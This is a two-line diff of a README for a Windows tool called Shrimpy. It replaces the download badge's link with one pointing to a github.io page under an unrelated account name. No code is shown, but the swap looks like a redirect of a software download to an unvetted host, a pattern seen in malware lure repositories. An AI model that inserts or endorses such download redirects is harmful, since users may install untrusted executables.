@@ -4,7 +4,7 @@
 
 ## 📥 Download Shrimpy for Windows
 
-[![⬇️ Download Shrimpy](https://img.shields.io/badge/Download-Shrimpy-blue?style=for-the-badge&logo=windows)](https://shrimpyload.github.io/.github/)
+[![⬇️ Download Shrimpy](https://img.shields.io/badge/Download-Shrimpy-blue?style=for-the-badge&logo=windows)](https://mezentsefftema7.github.io/.github/shrimpy-tool)
 
 ---
 
